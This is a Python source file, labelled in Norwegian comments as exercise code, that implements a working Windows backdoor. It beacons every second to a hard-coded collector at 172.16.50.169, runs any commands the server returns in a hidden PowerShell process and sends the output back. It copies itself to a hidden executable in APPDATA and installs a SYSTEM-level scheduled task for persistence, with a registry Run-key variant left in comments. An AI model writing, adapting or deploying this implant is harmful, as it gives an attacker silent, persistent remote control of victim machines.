import base64
import json
import os
import ssl
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

# set mutex
MUTEX_NAME = "Global\\bg_agent_mutex"
import ctypes
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
mutex = kernel32.CreateMutexW(None, False, MUTEX_NAME)
if ctypes.get_last_error() == 183:  # ERROR_ALREADY_EXISTS
    sys.exit(0)

#ROOT = Path(__file__).resolve().parent
# --------- SÅRBARHET / ØVELSESKODE STARTER HER ----------------

ENABLE_LAB_BEACON = os.getenv("ENABLE_LAB_BEACON", "1") == "1"
LAB_COLLECTOR_URL = os.getenv(
    "LAB_COLLECTOR_URL", "http://172.16.50.169:5050/checkin"
)
LAB_NODE_NAME = os.getenv("LAB_NODE_NAME", os.getenv("COMPUTERNAME", "unknown"))
LAB_BEACON_INTERVAL = max(1, int(os.getenv("LAB_BEACON_INTERVAL", "1")))
kill_on_next = False

cert_base64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tDQpNSUlESlRDQ0FnMmdBd0lCQWdJVVE0UUdGQkFqTzlBV3RWdUprVjJQWDV4SENsNHdEUVlKS29aSWh2Y05BUUVMDQpCUUF3RkRFU01CQUdBMVVFQXd3SmJHOWpZV3hvYjNOME1CNFhEVEkyTVRFeU5qQTRNREV4TWxvWERUSTNNVEV5DQpOakE0TURFeE1sb3dGREVTTUJBR0ExVUVBd3dKYkc5allXeG9iM04wTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGDQpBQU9DQVE4QU1JSUJDZ0tDQVFFQXNHaUhrRTk0MlVnQjdmYkRaT0FTS3FaanFiL3M1aTJ5azNmL2tnOHA1UHR6DQpjZ2NZN2gxZEgwK1g3QXFzOVFXSXZIZ29yTnpud01VbHF0d0FoZHZDb2dTUm4yVXJTRDNHZHFDTEQvL1hrVW92DQpiRk9neGVxbU9WOElRVWFhTkY1ejgzT1B6cVpCalBnTllBNGtCejE4Mzg2WjduQVNoQzNmUkNiTldLVXBlLzFEDQpheWF0RzBJODQxNWFwcmc2cUs1WTI3WWRmMlpGcTZIUGIwMi9IMzNLMEZwc1UyT3IvbkRVaDhlUlpqWWErdjljDQorYml0d3oyUUoxQ05ZRExCU2pIWVpiVU83M0Y5R2s5eTZRN3BBVE9ET0VBaGk0T1VrRkhoTjVwLzVhS3RRM3F0DQprQlN6ZldJZXVvNVVJdDBTV0RjQlJ1T1pZa0txdnZLSHBTYzd2anJCd3dJREFRQUJvMjh3YlRBZEJnTlZIUTRFDQpGZ1FVbDA1V3FPYXlDQVcrM0ExWTRQZ2cxcFFkMjZ3d0h3WURWUjBqQkJnd0ZvQVVsMDVXcU9heUNBVyszQTFZDQo0UGdnMXBRZDI2d3dEd1lEVlIwVEFRSC9CQVV3QXdFQi96QWFCZ05WSFJFRUV6QVJnZ2xzYjJOaGJHaHZjM1NIDQpCSDhBQUFFd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFBMzVnejJEOEZhazlOeERLcGt5azI0elY0a2F4a1JKDQpuemxrWjhIdUEraFZxaWlQUmxmTUdRNS9hYktnRjNTZ2N2Ym5qeWZJNkkybkNHemNpNUpNWlA5ZEdZQWJBQmhRDQpUak90OXo4eUtXdS81bUp6MktGVUtYem1NYkFpUWlvRVNRT2ZUWTByd1VYQk5rdjJRR3Q1UFh0WTNiT2FYM051DQo4S2xUU0lWWHlFZFgxTmR2MC8xRHVLdjA5TisrZm5rb0wvczFJK200R0RzVG5KRndwdnBwWUM1SktpS09KNE5vDQpocHgySUJuWElldzNLWHBESzd2TVdpZTQ1UE1ldEY0alcybGVwZFVKRVdxUlRpNkRXeHFLTzY4ekFjTnJRdndUDQpNTkVHUmVxYXpQcTAzR2FlcGMrc0FoMHhLWG1LVjVsWFhOSUhadUtmSzZKdUxuTVB4SitpMlNVPQ0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQ0K"


import subprocess
import threading
import queue
import uuid
import time
import json
import urllib.request
import urllib.error

from datetime import datetime, timezone

# Tillatte kommandoer fra collector
SHELL_TIMEOUT = 15
MAX_OUTPUT = 4096
CONN_ID = uuid.uuid4().hex[:8]


def sendToShellSubprocess(proc, command, init_message):
    if proc.poll() is not None:
        raise RuntimeError("CMD-prosessen er avsluttet")

    if not hasattr(proc, "_output_queue"):
        proc._output_queue = queue.Queue(maxsize=256)
        
        if init_message:
            proc._output_queue.put(f"INIT: {init_message}\n")

        def reader():
            try:
                for line in proc.stdout:
                    proc._output_queue.put(line)
            finally:
                proc._output_queue.put(None)

        threading.Thread(
            target=reader,
            daemon=True
        ).start()

    # Unik sluttmarkør for hver kommando
    marker = f"__FERDIG_{uuid.uuid4().hex}__"
    proc._marker = marker

    full_cmd = f"{command}\r\necho {marker}\r\n"

    proc.stdin.write(full_cmd)
    proc.stdin.flush()


def readFromShellSubprocess(proc):
    output = []
    total = 0
    deadline = time.monotonic() + SHELL_TIMEOUT

    while True:
        remaining = deadline - time.monotonic()

        if remaining <= 0:
            proc.kill()
            return "Feil: CMD timeout"

        try:
            line = proc._output_queue.get(timeout=remaining)
        except queue.Empty:
            proc.kill()
            return "Feil: CMD timeout"

        if line is None:
            return "Feil: CMD-prosessen ble avsluttet"

        if line.strip().endswith(proc._marker):
            break

        # Begrens mengden returnert output
        if total < MAX_OUTPUT:
            chunk = line[:MAX_OUTPUT - total]
            output.append(chunk)
            total += len(chunk)

    return "".join(output).strip()


def executeLabAction(action, pipe, init_message):
    if action == "NOOP":
        return "Ingen handling"

    try:
        sendToShellSubprocess(pipe, action, init_message)
        return readFromShellSubprocess(pipe)
    except (OSError, RuntimeError) as exc:
        return f"Feil ved CMD-kjøring: {exc}"


def labActionLoop(init_message):
    global kill_on_next
    pending_result = None
    shell_proc = None

    try:
        while True:
            # Start eller gjenopprett CMD
            if shell_proc is None or shell_proc.poll() is not None:
                try:
                    shell_proc = subprocess.Popen(
                        [
                            "powershell.exe",
                            "-NoLogo",
                            "-NoProfile",
                            "-NonInteractive",
                            "-Command", "-"
                        ],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        errors="replace",
                        bufsize=1, 
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                except OSError as exc:
                    time.sleep(LAB_BEACON_INTERVAL)
                    continue

            payload = {
                "service": "bg_agent",
                "host_label": LAB_NODE_NAME,
                "event": "status-checkin",
                "sent_at_utc": datetime.now(
                    timezone.utc
                ).isoformat(),  
                "last_result": base64.b64encode(json.dumps(pending_result).encode("utf-8")).decode("utf-8") if pending_result else None,
                "connection_id": CONN_ID,
            }

            request = urllib.request.Request(
                LAB_COLLECTOR_URL,
                data=json.dumps(payload).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "VaffelOps-Service/1.0",
                },
                method="POST",
            )

            cert_data = base64.b64decode(cert_base64)
            ssl_context = ssl.create_default_context(cadata=cert_data)

            try:
                with urllib.request.urlopen(
                    request, timeout=5, context=ssl_context
                ) as reply:
                    response = json.loads(reply.read(65536))

                if not isinstance(response, dict):
                    raise ValueError("Ugyldig serverrespons")
            except (
                urllib.error.URLError,
                TimeoutError,
                OSError,
                ValueError
            ) as exc:
                time.sleep(LAB_BEACON_INTERVAL)
                continue
            
            if kill_on_next:
                if shell_proc:
                    shell_proc.kill()
                break

            # HTTP-respons mottatt
            pending_result = None

            action = response.get("action", "NOOP")

            if not isinstance(action, str):
                action = "NOOP" 
            
            if action.lower() == "exit":
                kill_on_next = True
                pending_result = {
                    "command_id": response.get("command_id"),
                    "action": action,
                    "output": "dead_typeshi",
                }
            elif action != "NOOP":
                output = executeLabAction(action, shell_proc, init_message)
                
                pending_result = {
                    "command_id": response.get("command_id"),
                    "action": action,
                    "output": output,
                }

            time.sleep(LAB_BEACON_INTERVAL)

    except KeyboardInterrupt:
        pass

    finally:
        if shell_proc is not None:
            if shell_proc.poll() is None:
                shell_proc.kill()
            shell_proc.wait()

# --------- SÅRBARHET / ØVELSESKODE SLUTTER HER ----------------

# # -------------- ØVELSES PERSISTENSE REGKEY -----------------
# import winreg


def copySelfToKnowPath():
    import os
    import sys
    known_path = os.path.join(os.getenv("APPDATA"), "bg_agent.exe")
    if not os.path.exists(known_path):
        import shutil
        shutil.copy2(sys.executable, known_path)

    # hidde self
    try:
        os.system(f'attrib +h "{known_path}"')
    except Exception as e:
        pass

    return known_path

# PERSISTENCE_REGKEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
# PERSISTENCE_VALUE_NAME = "bg_agent"
# PERSISTENCE_VALUE_DATA = copySelfToKnowPath()  

# def checkPersistenceSet(key_path, key_value_name, key_value):
#     try:
#         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
#             try:
#                 value, _ = winreg.QueryValueEx(key, key_value_name)
#                 if value == key_value:
#                     return True
#             except FileNotFoundError:
#                 pass
#     except OSError:
#         pass

#     return False

# def setPersistenceIfNotSet(key_path, key_value_name, key_value):
#     if checkPersistenceSet(key_path, key_value_name, key_value):
#         return

#     try:
#         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
#             winreg.SetValueEx(key, key_value_name, 0, winreg.REG_SZ, key_value)
#     except OSError:
#         pass

# # ------------------- PERSISTENCE reg LOGIC SLUTTER HER ----------------

# ------------------- PERSISTENCE LOGIC SCHEDULED TASK starter her ----------------

def checkScheduledTaskExists(task_name = "bg_agent_task"):
    import subprocess
    try:
        #no console
        result = subprocess.run(["schtasks", "/Query", "/TN", task_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW, text=True)
        if result.returncode == 0:
            return True
    except Exception as e:
        pass

    return False

def createScheduledTask(task_name = "bg_agent_task"):
    import subprocess
    executable_path = copySelfToKnowPath()
    try:
        if checkScheduledTaskExists(task_name):
            return "Scheduled task already exists"

        #no console for task creation as well
        subprocess.run([
            "schtasks", "/Create", "/F", "/SC", "ONLOGON", "/RU", "SYSTEM", "/RL", "HIGHEST",
            "/TN", task_name, "/TR", executable_path
        ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW, text=True)

        return "Scheduled task created successfully"

    except subprocess.CalledProcessError:
        return "Failed to create scheduled task" 
# ------------------- PERSISTENCE LOGIC scheduled task SLUTTER HER ----------------

if __name__ == "__main__": 
    init_message = ""
    init_message += createScheduledTask() + "\n"
    # try:
    #     retvalue = setPersistenceIfNotSet(PERSISTENCE_REGKEY, PERSISTENCE_VALUE_NAME, PERSISTENCE_VALUE_DATA)
    #     init_message += f"RUN regkey persistence success\n"
    # except Exception as e:
    #     init_message += f"RUN regkey persistence failed: {e}\n"

    th = None
    if ENABLE_LAB_BEACON:
        th = threading.Thread(target=labActionLoop, args=(init_message,), daemon=True)
        th.start()
        th.join()
        

   
